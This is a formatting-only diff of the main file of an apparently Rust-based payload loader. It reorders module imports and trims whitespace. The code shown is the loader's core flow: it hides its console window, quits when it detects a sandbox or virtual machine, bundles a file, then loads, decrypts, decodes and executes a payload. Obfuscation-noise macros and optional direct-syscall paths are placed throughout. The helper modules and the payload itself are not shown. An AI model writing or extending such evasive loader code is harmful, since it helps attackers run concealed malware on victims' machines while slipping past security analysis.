@@ -1,24 +1,24 @@
 #![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
-mod utils;
-mod load;
-mod exec;
-mod decrypt;
 mod alloc;
-mod decode;
-mod syscall;
-mod ntapi;
 #[cfg(feature = "with_bundling")]
 mod bundle;
+mod decode;
+mod decrypt;
+mod exec;
+mod load;
+mod ntapi;
 #[cfg(feature = "sandbox")]
 mod sandbox;
+mod syscall;
+mod utils;
 
-use load::load;
-use decrypt::decrypt;
 use decode::decode;
+use decrypt::decrypt;
 use exec::exec;
+use load::load;
+use rsl_macros::obfuscation_noise_macro;
 #[cfg(feature = "debug")]
 use utils::{print_error, print_message};
-use rsl_macros::obfuscation_noise_macro;
 
 fn exit_program() -> ! {
     #[cfg(feature = "hw_syscall")]
@@ -44,21 +44,21 @@ fn main() {
 
     #[cfg(feature = "sandbox")]
     if sandbox::guard_vm() {
-        #[cfg(feature = "debug")] 
+        #[cfg(feature = "debug")]
         print_message("Sandbox/VM detected. Exiting...");
         exit_program();
     } else {
-        #[cfg(feature = "debug")] 
+        #[cfg(feature = "debug")]
         print_message("Passed Sandbox/VM detection.");
     }
 
     #[cfg(feature = "with_bundling")]
-    if let Err(_e) = bundle::bundlefile() {        
-        #[cfg(feature = "debug")]        
+    if let Err(_e) = bundle::bundlefile() {
+        #[cfg(feature = "debug")]
         print_error("Failed to bundle:", &_e);
         exit_program();
     } else {
-        #[cfg(feature = "debug")] 
+        #[cfg(feature = "debug")]
         print_message("Bundling succeeded.");
         obfuscation_noise_macro!();
     }
@@ -69,7 +69,7 @@ fn main() {
             print_message("Payload loaded successfully.");
             obfuscation_noise_macro!();
             data
-        },
+        }
         Err(_e) => {
             #[cfg(feature = "debug")]
             print_error("Failed to load:", &_e);
@@ -86,7 +86,7 @@ fn main() {
                 print_message("Payload decrypted successfully.");
                 obfuscation_noise_macro!();
                 p
-            },
+            }
             Err(_e) => {
                 #[cfg(feature = "debug")]
                 print_error("Failed to decrypt:", &_e);
@@ -100,6 +100,6 @@ fn main() {
             exit_program();
         }
     }
-    
+
     exit_program();
 }
